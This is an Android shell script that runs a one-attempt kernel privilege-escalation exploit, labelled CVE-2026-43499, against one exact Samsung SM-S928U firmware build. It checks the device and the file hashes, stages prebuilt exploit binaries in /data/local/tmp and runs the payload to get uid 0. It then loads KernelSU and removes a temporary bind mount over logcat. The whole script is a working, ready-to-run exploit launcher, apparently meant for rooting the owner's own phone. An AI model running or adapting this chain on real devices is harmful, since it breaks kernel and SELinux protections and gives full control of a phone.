#!/system/bin/sh
# SM-S928U S928USQS6DZF2 — one-attempt CVE-2026-43499 + KernelSU v32525
# Entry point: adb shell sh /sdcard/RootBoot/rootboot.sh
# Requires Android ADB shell identity (uid 2000). All paths are on the phone.

set -u
BASE=/storage/emulated/0/RootBoot
STAGE=/data/local/tmp
KERNEL='6.1.145-android14-11-33419968-abS928USQS6DZF2'
BUILD='S928USQS6DZF2'

fail() { echo "STOP: $*" >&2; exit 1; }
info() { echo "===== $* ====="; }

# This is intentionally limited to the ADB shell identity. Running directly
# as the Termux app user is not the successful exploitation environment.
[ "$(id -u)" = '2000' ] || fail 'Run from adb shell, or Termux connected to its own Wireless ADB (not plain Termux sh).'
command -v sha256sum >/dev/null 2>&1 || fail 'sha256sum not available.'
command -v getprop >/dev/null 2>&1 || fail 'Android shell utilities unavailable.'
[ -d "$BASE" ] || fail "Missing $BASE directory."

info 'CHECK EXACT DEVICE AND FIRMWARE'
MODEL=$(getprop ro.product.model)
RUNNING_KERNEL=$(uname -r)
RELEASE=$(getprop ro.build.version.release)
INCREMENTAL=$(getprop ro.build.version.incremental)
printf 'Model: %s\nAndroid: %s\nBuild: %s\nKernel: %s\n' "$MODEL" "$RELEASE" "$INCREMENTAL" "$RUNNING_KERNEL"
[ "$MODEL" = 'SM-S928U' ] || fail 'Wrong device model.'
[ "$RELEASE" = '16' ] || fail 'Wrong Android version.'
[ "$RUNNING_KERNEL" = "$KERNEL" ] || fail 'Wrong kernel: no attempt made.'
case "$INCREMENTAL" in
  *"$BUILD"*) ;;
  *) fail 'Wrong firmware build: no attempt made.' ;;
esac

# Do not re-enter the exploit if the in-memory module is already installed.
if grep -qi '^kernelsu[[:space:]]' /proc/modules; then
    info 'KERNELSU ALREADY LOADED'
    CURRENT=$(su -c id 2>&1) || fail "Module loaded but su failed: $CURRENT"
    echo "$CURRENT"
    [ "$(getenforce)" = 'Enforcing' ] || fail 'SELinux is not Enforcing.'
    echo 'SUCCESS: Existing KernelSU root is working. No exploit rerun.'
    exit 0
fi

if grep -q ' /system/bin/logcat ' /proc/self/mountinfo; then
    fail 'An existing bind mount covers /system/bin/logcat; inspect before continuing.'
fi

verify_hash() {
    src=$1
    expected=$2
    [ -f "$src" ] || fail "Missing file: $src"
    actual=$(sha256sum "$src" | cut -d ' ' -f 1) || fail "Cannot hash $src"
    [ "$actual" = "$expected" ] || fail "SHA-256 mismatch: $src"
}

info 'VERIFY FOUR ORIGINAL ARTIFACTS'
verify_hash "$BASE/cve43499-root" '54894e9bfa80fc36cfa03bd4ec4279e1d56eccc9719c9ee395b64ffd6792866b'
verify_hash "$BASE/cve43499-stable.so" '750a82852f3598f74d96037f73f22748302ab8860d1b6af54fddc276b7c3d3bc'
verify_hash "$BASE/ksud-s25u-kdp-v32525" '0404476629471d26233721f0a65a90f6fa57f4105416079dd91597027338e3fb'
verify_hash "$BASE/s928u-v32525-late-load-once.sh" 'e8dfbf44d3a94a6768d222bd60b80002b89cc1066e04608e9acf0f9e095e0ff0'

info 'STAGE EXECUTABLES IN /data/local/tmp'
cp "$BASE/cve43499-root" "$STAGE/cve43499-root" || fail 'Cannot stage root helper.'
cp "$BASE/cve43499-stable.so" "$STAGE/cve43499-stable.so" || fail 'Cannot stage exploit payload.'
cp "$BASE/ksud-s25u-kdp-v32525" "$STAGE/ksud-s25u-kdp-v32525" || fail 'Cannot stage KernelSU loader.'
cp "$BASE/s928u-v32525-late-load-once.sh" "$STAGE/s928u-v32525-late-load-once.sh" || fail 'Cannot stage late-load script.'
chmod 755 "$STAGE/cve43499-root" "$STAGE/ksud-s25u-kdp-v32525" || fail 'Cannot set executable permissions.'

verify_hash "$STAGE/cve43499-root" '54894e9bfa80fc36cfa03bd4ec4279e1d56eccc9719c9ee395b64ffd6792866b'
verify_hash "$STAGE/cve43499-stable.so" '750a82852f3598f74d96037f73f22748302ab8860d1b6af54fddc276b7c3d3bc'
verify_hash "$STAGE/ksud-s25u-kdp-v32525" '0404476629471d26233721f0a65a90f6fa57f4105416079dd91597027338e3fb'
verify_hash "$STAGE/s928u-v32525-late-load-once.sh" 'e8dfbf44d3a94a6768d222bd60b80002b89cc1066e04608e9acf0f9e095e0ff0'

info 'RUN ONE BOOTSTRAP EXPLOIT ATTEMPT'
EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=45 EXPLOIT_ATTEMPT_TIMEOUT_SEC=120 \
    "$STAGE/cve43499-root" --run-payload \
    "$STAGE/cve43499-stable.so" \
    "$STAGE/cve43499-root" \
    "$STAGE/cve43499-rootboot-bootstrap.log"
EXPLOIT_RESULT=$?
[ "$EXPLOIT_RESULT" -eq 0 ] || fail "Bootstrap exploit exited $EXPLOIT_RESULT. No retry."

info 'VERIFY BOOTSTRAP ROOT'
BOOTSTRAP=$(
    "$STAGE/cve43499-root" -c 'id; getenforce' 2>&1
) || fail 'Bootstrap verification command failed. No loader attempted.'
echo "$BOOTSTRAP"
case "$BOOTSTRAP" in
  *'uid=0(root)'*) ;;
  *) fail 'Bootstrap root not verified. No loader attempted.' ;;
esac

info 'START VERIFIED KERNELSU V32525 LOADER'
# Prior successful late-load calls may remain occupied. Launch exactly once,
# poll separately, then unmount the temporary /system/bin/logcat bind mount.
LATELOG="$BASE/rootboot-late-load.log"
"$STAGE/cve43499-root" -c "sh $STAGE/s928u-v32525-late-load-once.sh" > "$LATELOG" 2>&1 &
LOADER_PID=$!
echo "Loader process started (PID $LOADER_PID); log: $LATELOG"

attempt=0
while [ "$attempt" -lt 90 ]; do
    if grep -qi '^kernelsu[[:space:]]' /proc/modules; then
        ROOT_ID=$(su -c id 2>&1)
        ROOT_RESULT=$?
        POLICY=$(getenforce)
        if [ "$ROOT_RESULT" -eq 0 ]; then
            case "$ROOT_ID" in
                *'uid=0(root)'*)
                    if [ "$POLICY" = 'Enforcing' ]; then
                        info 'RESTORE ORIGINAL LOGCAT'
                        if grep -q ' /system/bin/logcat ' /proc/self/mountinfo; then
                            su -c 'umount /system/bin/logcat' || fail 'KernelSU loaded; failed to unmount /system/bin/logcat.'
                        fi
                        if grep -q ' /system/bin/logcat ' /proc/self/mountinfo; then
                            fail 'KernelSU loaded but /system/bin/logcat bind mount remains.'
                        fi
                        info 'SUCCESS'
                        echo "$ROOT_ID"
                        echo "SELinux: $POLICY"
                        grep -i '^kernelsu[[:space:]]' /proc/modules
                        echo 'KernelSU Manager should display driver 32525 and no version mismatch.'
                        echo 'Root is temporary and is lost on reboot.'
                        exit 0
                    fi
                    ;;
            esac
        fi
    fi
    if ! kill -0 "$LOADER_PID" 2>/dev/null; then
        echo 'Loader exited before KernelSU was verified. Recent loader log:'
        tail -n 30 "$LATELOG" 2>/dev/null
        fail 'KernelSU activation was not verified; do not automatically rerun.'
    fi
    attempt=$((attempt + 1))
    sleep 2
done

echo 'KernelSU was not verified after 180 seconds. Recent loader log:'
tail -n 30 "$LATELOG" 2>/dev/null
fail 'No automatic second attempt. Inspect the phone and logs.'
